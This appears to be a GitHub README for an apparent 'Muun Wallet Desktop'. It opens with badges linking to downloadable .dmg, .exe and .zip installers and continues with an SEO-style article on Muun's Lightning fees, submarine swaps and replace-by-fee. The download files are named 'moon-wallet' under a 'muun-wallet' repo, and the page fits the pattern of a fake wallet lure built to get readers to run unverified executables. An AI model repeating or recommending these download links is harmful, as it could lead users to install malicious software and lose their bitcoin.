[![Muun Wallet](https://img.shields.io/badge/Muun%20Wallet-Desktop-blue)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Platforms](https://img.shields.io/badge/platforms-macOS%20%7C%20Windows%20%7C%20Linux-lightgrey)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![License](https://img.shields.io/badge/license-MIT-green)](https://github.com/muun-network/muun-wallet/blob/main/LICENSE)

[![macOS](https://img.shields.io/badge/Download-macOS-black?logo=apple&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.dmg) [![Windows](https://img.shields.io/badge/Download-Windows-0078d4?logo=windows&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe) [![Linux](https://img.shields.io/badge/Download-Linux-f5a623?logo=linux&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.zip)

---

# Muun Wallet Lightning Fees Explained

"Muun's Lightning fees are too high" is one of the most common complaints about Muun across Bitcoin forums. It is also one of the most misunderstood, because the fees are not arbitrary — they follow directly from the architecture. This article explains exactly why Muun's Lightning fees work the way they do, what you are actually paying for, and how Muun Wallet Desktop makes fees visible before you commit to a payment.

---

## Why Muun's Lightning fees are different

Most Lightning wallets — Phoenix, Zeus, Breez — maintain native Lightning channels. When you send a Lightning payment, the cost is a routing fee charged by the nodes along the payment path, typically measured in millisatoshis and often fractions of a cent for small payments.

Muun does not use native Lightning channels. Instead, it uses **submarine swaps**: when you send a Lightning payment, Muun converts your on-chain Bitcoin into a Lightning payment behind the scenes by performing an atomic swap between the two layers. The on-chain side of that swap is what determines your fee — it is an actual Bitcoin transaction that must be mined, and its cost follows the Bitcoin mempool fee market at the moment you send.

This is why Muun Lightning fees can be significantly higher than other Lightning wallets during periods of high mempool congestion, and much lower than other Lightning wallets during quiet mempool periods. The fee is not set by Muun — it is set by the Bitcoin network.

---

## What the fee actually covers

When you send a Lightning payment in Muun Wallet, the total fee shown before confirmation includes:

- **On-chain mining fee**: the cost to get the swap transaction confirmed on the Bitcoin blockchain, calculated from current mempool conditions
- **Swap service fee**: a small percentage charged for the swap infrastructure that connects the on-chain and Lightning sides

The on-chain mining fee is by far the larger component during busy periods. The swap service fee is typically small by comparison.

---

## The mempool-based fee estimator

Muun Wallet Desktop shows a live fee estimate before you confirm any payment. This estimate is calculated from actual current mempool conditions — not a fixed table, not an average, not a round number. You see the real expected cost of the transaction before you commit to it.

If the estimate is higher than you expected, this is the mempool telling you the Bitcoin network is currently congested. You have the option to wait and try again when congestion is lower — fees can change significantly within hours. The fee display in Muun Wallet Desktop makes this decision easy because the cost is visible upfront rather than discovered afterward.

---

## When Muun's fees are competitive

During low-mempool periods, Muun's Lightning fees can be very competitive — sometimes lower than the routing fees on wallets using native Lightning channels, because on-chain fees drop to near-minimum levels and the swap becomes inexpensive. The swap model is not always the expensive option; it is the variable option, and that variability works in both directions.

For on-chain Bitcoin sends (not Lightning), Muun's mempool-based estimator also helps you avoid overpaying. The site's own fee page documents that Muun's estimates have been meaningfully more efficient than fixed-rate alternatives during moderate congestion periods.

---

## When Muun's fees are unfavorable

Small Lightning payments during high-congestion periods are the worst case for Muun's fee model. Because the on-chain component of the swap is roughly fixed in size regardless of how much you are sending, a small payment (say, a few thousand satoshis) can end up with a fee that is a substantial percentage of the amount. The [comparison with Phoenix Wallet](muun-wallet-vs-phoenix-wallet.md) covers this contrast in detail — Phoenix's native channel model handles small Lightning payments at much lower relative cost during congestion.

If you regularly send small Lightning payments and live in a high-fee mempool environment, this is worth considering before choosing Muun as your primary Lightning wallet.

---

## Replace-by-fee for stuck transactions

On Muun Wallet Desktop, if an on-chain transaction (including the on-chain leg of a swap) gets stuck because you confirmed during a period of lower fees and the mempool has since moved up, the replace-by-fee (RBF) button lets you broadcast a new version of the transaction at a higher fee rate. This resolves the most common stuck-transaction complaint about Muun without requiring any external tool or support ticket. See [how to fix a stuck transaction](muun-wallet-stuck-transaction-rbf.md) for the full walkthrough.

---

## The Lightning address trade-off

Muun now supports Lightning Addresses (LNURL-pay), which let you receive payments at a static human-readable address rather than generating a new invoice for each payment. This is particularly useful for tip jars, donations, or recurring payments where you cannot generate a fresh invoice each time. The underlying swap mechanics remain the same — the Lightning Address just automates invoice generation on your behalf.

---

## Practical tips for managing Muun fees

- **Check the fee before confirming** — Muun always shows it. If it looks high, that is current mempool congestion, not a bug or a mistake.
- **Time sensitive payments with mempool state** — fees tend to be lower on weekends and during off-peak periods in Western time zones, when transaction demand is lower.
- **Use the RBF button if a transaction stalls** — instead of waiting indefinitely for a low-fee transaction to eventually confirm.
- **Compare fee percentage to amount** — for very small Lightning payments during congestion, the fee as a percentage of the amount can be high; for larger amounts, it is typically much more reasonable.

For a full side-by-side of how Muun's fees compare to alternatives, see [best Bitcoin Lightning wallets 2026](best-bitcoin-lightning-wallets-2026.md).

---

## Related articles

- [What is a submarine swap?](what-is-a-submarine-swap.md)
- [Muun Wallet fees explained: all cost types](muun-wallet-fees-explained.md)
- [How to fix a stuck transaction in Muun Wallet (RBF)](muun-wallet-stuck-transaction-rbf.md)
- [Muun Wallet vs Phoenix Wallet](muun-wallet-vs-phoenix-wallet.md)
- [Is Muun Wallet safe?](is-muun-wallet-safe.md)
